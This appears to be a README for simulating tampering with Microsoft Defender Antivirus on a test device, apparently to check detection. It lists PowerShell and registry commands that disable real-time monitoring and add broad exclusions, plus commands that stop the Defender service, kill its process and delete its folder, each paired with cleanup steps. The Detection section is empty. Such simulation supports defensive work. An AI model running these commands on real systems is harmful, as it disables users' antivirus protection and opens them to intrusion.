# Defender AV Tampering Detection

Microsoft Defender AV Tampering is a technique where attackers disable or interfere with Microsoft Defender Antivirus to avoid detection of their malicious tools and activities. This may involve killing Defender processes, modifying registry keys, or blocking updates, which disrupts security scanning and prevents the latest security protections from being applied.

## Simulation

Run the following commands in PowerShell / Windows Command Prompt on a test device

1. PowerShell: Detect
1. Registry Key: Detect
1. Stop Service, Stop process, Delete folder :Prevent

---

### Attack using Powershell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -ExclusionExtension "exe" -ExclusionPath "C:\"
```

#### Cleanup - Commands in PowerShell

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -MAPSReporting 2
Remove-MpPreference -ExclusionExtension "exe" -ExclusionPath "C:\"
```

> *Script:* [download](Tamper-DefenderService.ps1)

---

### Attack using Registry

```dos
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /t REG_SZ /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\\" /t REG_SZ /d "" /f
```

#### Cleanup - Commands for Registry

```dos
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /f
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" /v "exe" /f
reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /f
```

### Attack using SC & NET

```dos
sc stop WinDefend
net stop WinDefend
```

### Attack - Run the commands in Windows cmd

```dos
taskkill /IM MsMpEng.exe /F
rem Attack - Run the commands in Windows cmd
rmdir /s /q "C:\Program Files\Windows Defender"
```

## Detection